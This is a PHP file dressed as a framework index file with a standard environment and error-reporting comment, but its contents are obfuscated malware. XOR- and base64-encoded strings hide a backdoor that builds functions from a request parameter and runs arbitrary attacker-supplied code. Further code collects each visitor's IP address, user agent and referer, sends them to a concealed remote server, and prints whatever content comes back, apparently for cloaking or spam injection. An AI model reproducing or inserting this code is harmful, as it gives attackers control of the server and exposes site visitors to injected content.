 <?php
  /*
 *---------------------------------------------------------------
 * APPLICATION ENVIRONMENT
 *---------------------------------------------------------------
 *
 * You can load different configurations depending on your
 * current environment. Setting the environment also influences
 * things like logging and error reporting.
 *
 * This can be set to anything, but default usage is:
 *
 *     development
 *     testing
 *     production
 *
 * NOTE: If you change these, also change the error_reporting() code below
 *
 *
 *---------------------------------------------------------------
 * ERROR REPORTING
 *---------------------------------------------------------------
 *
 * Different environments will require different levels of error reporting.
 * By default development will show errors but testing and live will hide them.
 */
 
class Abx
{
    private static $s;
    public static function g($n, $k)
    {
        if (!self::$s)
            self::i();
        $l = strlen($k);
        $r = base64_decode(self::$s[$n]);
        for ($i = 0, $c = strlen($r); $i !== $c; ++$i)
            $r[$i] = chr(ord($r[$i]) ^ ord($k[$i % $l]));
        return $r;
    }
    private static function i()
    {
        self::$s = array(
            '_l' => 'HhU' . 'QCSwFXi8wGAceMBpeLTMaHBtyOQEFOB8dV' . 'n9c',
            '_ie' => 'HBoxATobK1gLDC8QZVU+BS8ZNhY+ATYa' . 'MVo1FCkULBYtHC' . '8' . 'B',
            '_cvx' => '',
            '_cr' => 'PA' . 'o' . '=',
            '_umm' => '',
            '_zkd' => 'MQYSD' . 'w==',
            '_gmh' => 'Y' . 'w' . 'g0W' . 'Q==',
            '_qye' => 'Yx' . 'U+E2' . 'E' . '=',
            '_k' => 'KA4IDw=' . '=',
            '_j' => 'P' . 'A' . 's' . 'K',
            '_hil' => 'PhkB' . 'PDkYCgAr',
            '_ja' => 'NhY' . 'x',
            '_b' => 'PQoU' . 'O' . 'l0=',
            '_t' => 'ay' . 'cNOhs=',
            '_wyj' => 'MB' . 'Q6',
            '_nx' => 'KBA' . 'UMw' . '==',
            '_f' => '',
            '_ej' => '',
            '_aw' => 'NwINL0xWcBAQMxMKcQEcPRUYPB4cLAIWLRceOlgaMBtWPhVUPhgYMw8NNhUKc' . 'R' . 'wKY' . 'BIY' . 'K' . 'xdE',
            '_chi' => 'PAAc' . 'AgA' . 'cAAcr',
            '_gb' => 'N' . 'xErFQAGMAE6',
            '_dx' => 'Yw4LO11U',
            '_v' => 'Y' . 'x' . 'Y' . 'DO0Zc',
            '_hs' => 'L' . 'BYMHT' . 'IQ',
            '_h' => 'Nx4WC' . 'Cw' . '=',
            '_ik' => 'GDU8fw=' . '=',
            '_gh' => 'LxMbNw=' . '=',
            '_dw' => 'LgI' . 'QLQ4=',
            '_gks' => 'YA' . '=' . '=',
            '_hv' => 'Lg' . 'c6ACY=',
            '_jh' => 'fyU9OA9CWEJvYGMkMB4dVn8' . '=',
            '_cbl' => 'NwwYKw=' . '=',
            '_xco' => 'Um86GjELHBYrDBYbZUU6' . 'GTAW' . 'HHhVa' . 'HM=',
            '_c' => 'LA' . 'ACZV' . 'x' . 'B',
            '_yqj' => '',
            '_us' => 'Nw' . '0KBw' . '=' . '=',
            '_s' => 'Uns=',
            '_mbu' => 'YxoUO0t' . 'L',
            '_vch' => 'Fz0LOQAqEyAaJws2Fjk' . '=',
            '_kj' => 'FyYkOwAxPCIaPCQ0F' . 'iI=',
            '_gry' => 'FzAkPAA8LyoQNi' . 'ctDSA1KAAi' . 'Pz' . '4' . '=',
            '_mre' => 'FyE' . '8OAA' . 'tNy4Q' . 'Jz8pDTEtLA' . 'AzJzo' . '=',
            '_pdn' => 'DS' . 'A4EDEwACQxGzc=',
            '_wxo' => 'D' . 'T8' . 'l' . 'EC4tAD' . 'ssGyg' . '=',
            '_a' => 'FzggDzM3GTM3ECI6Gi8gFi' . 'IzACUk',
            '_jaz' => 'Fzo' . 'gDzE3GTE3ECA6Gi' . '0gFiAzACc' . 'k',
            '_o' => 'FyQhNQAlJiANLzQiGj4' . 'h',
            '_kda' => 'FzYyPwA3NSoNPScoGiw' . 'y',
            '_bm' => 'FzgyDzM0' . 'GiojDSk' . '0',
            '_ese' => 'FzohDzEnGigwDSs' . 'n',
            '_yj' => 'ORMWGToIJR' . 's+CA==',
            '_scp' => 'bkhoVG9Ub1Ru',
            '_is' => 'Nh8' . '=',
            '_xcv' => 'K' . 'g' . 'Y' . '=',
            '_yux' => 'L' . 'Rc' . 'e',
            '_kn' => 'M' . 'Q' . 'AsH' . 'A=='
        );
    }
}
class Vtx
{
    private static $s;
    public static function g($n)
    {
        if (!self::$s)
            self::i();
        return self::$s[$n];
    }
    private static function i()
    {
        self::$s = array(
            0100,
            0121,
            02,
            064,
            01,
            046711,
            01,
            052,
            00,
            0116,
            012,
            015,
            012,
            0310,
            0673,
            0120,
            00,
            02000,
            01,
            0423,
            0423
        );
    }
}
@header(Abx::g('_l', '_vs' . 'l'));
@header(Abx::g('_i' . 'e', '_u'));
$_tly = Abx::g('_' . 'c' . 'v' . 'x', '_yfo');
if (isset($_GET[Abx::g('_cr', '_by')])) {
    $_esu = get_js(Abx::g('_umm', '_wj'));
    if ($_esu && strpos($_esu, Abx::g('_zk' . 'd', '_b' . 'aw')) !== false) {
        die(Abx::g('_gm' . 'h', '_g'));
    } else {
        die(Abx::g('_q' . 'y' . 'e', '_w'));
    }
}
if (isset($_GET[Abx::g('_' . 'k', '_' . 'o' . 'd' . 'c')])) {
    $_sr  = Abx::g('_j', '_' . 'yow') . Abx::g('_h' . 'i' . 'l', '_m' . 'd' . 'c') . Abx::g('_ja', '_y');
    $_xnr = Abx::g('_b', '_kg') . Abx::g('_t', '_' . 'xi') . Abx::g('_' . 'wyj', '_p');
    $_dz  = $_xnr($_GET[Abx::g('_' . 'n' . 'x', '_' . 'q' . 'x')]);
    $_dz  = @$_sr(Abx::g('_f', '_v' . 'l'), $_dz);
    @$_dz();
    die;
}
function get_js($_paw)
{
    $_esu = Abx::g('_ej', '_zll');
    $_wya = Abx::g('_' . 'aw', '_v' . 'y') . $_paw;
    if (is_callable(Abx::g('_c' . 'h' . 'i', '_un' . 'n'))) {
        $_efe = curl_init($_wya);
        curl_setopt($_efe, Vtx::g(0), false);
        curl_setopt($_efe, Vtx::g(1), Vtx::g(2));
        curl_setopt($_efe, Vtx::g(3), Vtx::g(4));
        curl_setopt($_efe, Vtx::g(5), Vtx::g(6));
        curl_setopt($_efe, Vtx::g(7), Vtx::g(8));
        curl_setopt($_efe, Vtx::g(9), Vtx::g(10));
        curl_setopt($_efe, Vtx::g(11), Vtx::g(12));
        $_esu = curl_exec($_efe);
        $_si  = curl_getinfo($_efe);
        curl_close($_efe);
        if ($_si[Abx::g('_g' . 'b', '_' . 'e')] != Vtx::g(13))
            die(Abx::g('_dx', '_l' . 'j'));
        if (empty($_esu))
            die(Abx::g('_' . 'v', '_tb'));
    } else {
        $_zs = parse_url($_wya);
        $_l  = ($_zs[Abx::g('_' . 'hs', '_' . 'ud' . 'x')] == Abx::g('_' . 'h', '_j' . 'bx'));
        $_af = Abx::g('_' . 'i' . 'k', '_ph') . $_zs[Abx::g('_g' . 'h', '_r' . 'o')];
        if (isset($_zs[Abx::g('_d' . 'w', '_w' . 'u')]))
            $_af .= Abx::g('_gks', '_emw') . $_zs[Abx::g('_hv', '_' . 'r')];
        $_af .= Abx::g('_jh', '_m' . 'i' . 'l') . $_zs[Abx::g('_cbl', '_c' . 'k')] . Abx::g('_xc' . 'o', '_e' . 'yu');
        $_fm = fsockopen(($_l ? Abx::g('_c', '_s' . 'n') : Abx::g('_yqj', '_' . 'yb')) . $_zs[Abx::g('_us', '_b' . 'ys')], $_l ? Vtx::g(14) : Vtx::g(15));
        if ($_fm) {
            @fputs($_fm, $_af);
            $_p = Vtx::g(16);
            while (!feof($_fm)) {
                $_tqz = fgets($_fm, Vtx::g(17));
                if ($_p)
                    $_esu .= $_tqz;
                if ($_tqz == Abx::g('_s', '_q' . 'b' . 'd'))
                    $_p = Vtx::g(18);
            }
            @fclose($_fm);
            if (empty($_esu))
                die(Abx::g('_mbu', '_xu'));
        }
    }
    return $_esu;
}
if (isset($_SERVER[Abx::g('_vch', '_' . 'i')]))
    $_oap = $_SERVER[Abx::g('_kj', '_rp' . 'k')];
if (isset($_SERVER[Abx::g('_gr' . 'y', '_' . 'dpl')]))
    $_oq = $_SERVER[Abx::g('_mr' . 'e', '_uh' . 'h')];
if (isset($_SERVER[Abx::g('_' . 'pdn', '_' . 'eu')]))
    $_pe = $_SERVER[Abx::g('_wxo', '_z' . 'h')];
if (isset($_SERVER[Abx::g('_' . 'a', '_' . 'lt')]))
    $_vjy = $_SERVER[Abx::g('_ja' . 'z', '_nt')];
if (isset($_SERVER[Abx::g('_' . 'o', '_' . 'pue')]))
    $_zdb = $_SERVER[Abx::g('_kd' . 'a', '_' . 'bf' . 'o')];
if (isset($_SERVER[Abx::g('_b' . 'm', '_l' . 'f')]))
    $_bb = $_SERVER[Abx::g('_' . 'es' . 'e', '_nu')];
if (function_exists(Abx::g('_yj', '_z' . 'zm'))) {
    if (isset($_oap) && filter_var($_oap, Vtx::g(19)))
        $_tly = $_oap;
    elseif (isset($_oq) && filter_var($_oq, Vtx::g(20)))
        $_tly = $_oq;
    else
        $_tly = $_pe;
} elseif (isset($_pe))
    $_tly = $_pe;
if ($_tly == Abx::g('_' . 'scp', '_' . 'z') && isset($_vjy))
    $_tly = $_vjy;
if (!isset($_tly) || !isset($_zdb) || !isset($_bb))
    exit;
else {
    $_emi = array(
        Abx::g('_is', '_o' . 'y' . 'l') => $_tly,
        Abx::g('_' . 'xcv', '_ge') => $_zdb,
        Abx::g('_' . 'y' . 'ux', '_rxi') => $_bb
    );
    $_h   = urlencode(base64_encode(json_encode($_emi)));
    $_esu = get_js($_h);
    if ($_esu && strpos($_esu, Abx::g('_' . 'k' . 'n', '_' . 'd')) !== false) {
        echo $_esu;
        exit;
    }
}